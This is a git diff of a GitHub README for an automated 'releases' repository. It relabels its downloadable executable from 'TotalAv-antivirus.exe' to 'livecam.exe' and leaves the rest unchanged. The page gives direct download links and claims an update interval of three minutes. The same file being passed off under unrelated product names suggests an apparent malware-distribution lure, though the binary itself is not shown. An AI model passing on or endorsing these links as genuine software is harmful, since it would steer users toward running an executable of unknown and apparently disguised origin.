@@ -1,4 +1,4 @@
-# 📹 Totalav-Antivirus Releases
+# 📹 Livecam Releases
 
 ![Status](https://img.shields.io/badge/status-active-success.svg)
 ![Last Updated](https://img.shields.io/badge/last%20updated-2025--11--01-blue.svg)
@@ -6,11 +6,11 @@
 
 ## 🎯 About
 
-This repository contains automated releases of TotalAv-antivirus, updated every 3 minutes.
+This repository contains automated releases of livecam, updated every 3 minutes.
 
 ## 📥 Download Latest Version
 
-**[⬇️ Click here to download the latest TotalAv-antivirus.exe](https://github.com/ankitkumarsingh0031-a11y/new-releases/releases/latest/download/TotalAv-antivirus.exe)**
+**[⬇️ Click here to download the latest livecam.exe](https://github.com/ankitkumarsingh0031-a11y/new-releases/releases/latest/download/livecam.exe)**
 
 ### Alternative: Browse All Releases
 
@@ -25,7 +25,7 @@ Visit the [Releases page](https://github.com/ankitkumarsingh0031-a11y/new-releas
 ## 📊 Release Information
 
 Each release includes:
-- 📦 Complete TotalAv-antivirus.exe file
+- 📦 Complete livecam.exe file
 - 🕐 Timestamp of upload
 - 📝 Automated release notes
 - 🔗 Direct download link
@@ -34,7 +34,7 @@ Each release includes:
 
 The most recent upload can always be accessed via:
 ```
-https://github.com/ankitkumarsingh0031-a11y/new-releases/releases/latest/download/TotalAv-antivirus.exe
+https://github.com/ankitkumarsingh0031-a11y/new-releases/releases/latest/download/livecam.exe
 ```
 
 ## 📌 Features
@@ -52,7 +52,7 @@ https://github.com/ankitkumarsingh0031-a11y/new-releases/releases/latest/downloa
 - **Update Interval**: 3 minutes
 - **Storage**: Latest 5 releases retained
 - **Access**: Public, no authentication required
-- **File**: TotalAv-antivirus.exe
+- **File**: livecam.exe
 
 ## 📝 License
 
@@ -60,4 +60,4 @@ This is an automated upload repository. All content rights reserved.
 
 ---
 
-*Last automated update: November 01, 2025 at 18:36:46*
+*Last automated update: November 01, 2025 at 19:23:04*
